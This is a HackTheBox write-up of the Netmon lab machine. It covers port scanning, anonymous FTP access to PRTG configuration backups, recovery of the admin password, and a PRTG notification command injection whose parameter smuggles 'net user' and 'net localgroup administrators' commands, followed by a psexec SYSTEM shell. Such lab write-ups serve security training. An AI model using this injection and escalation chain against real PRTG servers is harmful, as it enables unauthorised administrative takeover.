Netmon Machine Writeup- HackTheBox

Posted on 2020-12-08 | In HTB , Writeup , Machine

Methodology

  1. Open Ports Enumeration
  2. FTP Service Enumeration
  3. User Flag identified through FTP service
  4. Admin credentials identified from FTP service
  5. Authenticated RCE identified
  6. New SYSTEM user added
  7. SYSTEM shell gained

Open Ports Enumeration

The open ports enumeration through targetRecon1, had identified five open ports namely, FTP (21), HTTP (80), MSRPC (135), NETBIOS-SSN (139) and MICROSOFT-DS (445). The scan had not identified any publicly known vulnerabilities. The results of the scan are given below.

arcolinux :: Tracks/Beginner/Netmon » targetRecon 10.10.10.152
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		21      ftp
		80      http
		135     msrpc
		139     netbios-ssn
		445     microsoft-ds
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 21 10.10.10.152
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:42 IST
Nmap scan report for 10.10.10.152 (10.10.10.152)
Host is up (0.21s latency).

FTP Service Enumeration

The target had been configured to allow anonymous access to everyone. The FTP service allowed access to the Users directory and subsequently to user.txt. The user flag file was transferred to the attacking host through get command, and the flag was read. The same is shown on the section given below along with a screenshot.

➜  Netmon ftp 10.10.10.152

Remote system type is Windows_NT.

Privilege Escalation

Browsing to http://10.10.10.152, revealed a login page to PRTG Network Monitor. After few failed attempts with default and lazy admin credentials, the reasonable path seemed liked enumerating more for credentials. As the FTP service gave direct access to the OS installation drive, C:, a search for sensitive files was carried out. After a substantial amount of browsing through files, four sensitive files were identified on /Users/All Users/Paessler/PRTG Network Monitor, namely PRTG Configuration.dat, PRTG Configuration.old, PRTG Configuration.old.bak, PRTG Graph Data Cache.dat. The files were transferred to the attacking host using get command, and then searched for any sensitive data.

ftp> pwd
257 "/Users/All Users/Paessler/PRTG Network Monitor" is current directory.
ftp> ls -al
200 PORT command successful.
125 Data connection already open; Transfer starting.
12-07-20  08:57AM       <DIR>          Configuration Auto-Backups
12-07-20  08:16AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
12-07-20  08:16AM       <DIR>          Logs (Web Server)
12-07-20  08:21AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak

A quick google search had revealed the admin username for PRTG Network Monitor as prtgadmin. Searching for the pattern on the transferred files revealed a password PrTg@dmin2018 on the file PRTG Configuration.old.bak. The same is shown on the section given below.

~/HTB/Tracks/Beginner/Netmon  $ cat PRTG* | grep "prtgadmin" -A 1 -B 1  
				<login>
				  prtgadmin
				</login>
--
				<login>
				  prtgadmin
				</login>
--
			<dbpassword>
			  <!-- User: prtgadmin -->
			  PrTg@dmin2018
--
				<login>
				  prtgadmin
				</login>

Using the credentials prtgadmin:PrTg@admin2018 resulted in a failed attempt. Considering the fact that this was found on a backup file, another attempt was carried out with changing the year to 2019. The credentials prtgadmin:PrTg@2019 had worked and gave admin access to the PRTG Network Monitor application.
The logged-in session had revealed the current version of the installation as 18.1.37.13946. Google-Fu had revealed a Remote Command Execution2 vulnerability on versions prior to 18.2.39. Following the steps, a new notification was created by browsing through Home -> Setup -> Account Settings -> New Notifications. The command to be executed is to be placed on Parameter box from the Execute Program section. For the purpose of elevating privileges, commands to add a new SYSTEM user, offsec, were added to the parameter as user.txt;net user offsec Netmon! /add;net localgroup administrators offsec /add. A screenshot ‘Execute Program’ section with the parameter added is shown below. The command was then executed on the target by generating the newly created notification. Now that a new SYSTEM user had been added to the target, the target was accessed using psexec.py through the command psexec.py 'offsec:Netmon!@10.10.10.152'. This gave complete access to the target with elevated privileges, along with access to the root flag. The same is shown on the section below.

➜  Netmon psexec.py 'offsec:Netmon!@10.10.10.152'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file oNtCnyqM.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service buNb on 10.10.10.152.....
[*] Starting service buNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
